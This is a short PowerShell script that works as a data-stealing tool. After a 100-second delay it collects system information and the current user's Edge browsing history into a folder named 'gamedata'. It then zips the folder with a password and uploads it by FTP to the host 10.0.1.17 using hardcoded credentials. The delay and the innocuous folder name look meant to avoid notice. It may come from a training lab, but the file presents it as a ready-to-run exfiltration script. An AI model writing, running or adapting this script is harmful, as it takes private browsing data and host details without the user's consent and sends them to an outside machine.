Start-Sleep -Seconds 100
systeminfo > C:\Windows\Temp\gamedata\systeminformation.txt
$browsing_history_file_path = "C:\Users\" + $Env:UserName + "\AppData\Local\Microsoft\Edge\User Data\Default\History"
cp $browsing_history_file_path C:\Windows\Temp\gamedata
# Set the path to the 7-Zip executable (replace with your actual path)
$zipExePath = "C:\Program Files\7-Zip\7z.exe"

# Set the path to the folder you want to zip
$folderToZip = "C:\Windows\Temp\gamedata"

# Set the path for the output zip file
$zipFilePath = "C:\Windows\Temp\gamedata.zip"

# Set the password for the zip file
$zipPassword = "batman"

# Compress the folder to a zip file with 7-Zip and password protection
Start-Process -FilePath $zipExePath -ArgumentList "a -tzip -p$zipPassword -r -y $zipFilePath $folderToZip" -Wait

Write-Host "Folder successfully zipped and password-protected. Zip file: $zipFilePath"

$client = New-Object System.Net.WebClient
$client.Credentials = New-Object System.Net.NetworkCredential("elliot", "Password1")
$client.UploadFile("ftp://10.0.1.17/gamedata.zip","C:\Windows\Temp\gamedata.zip")
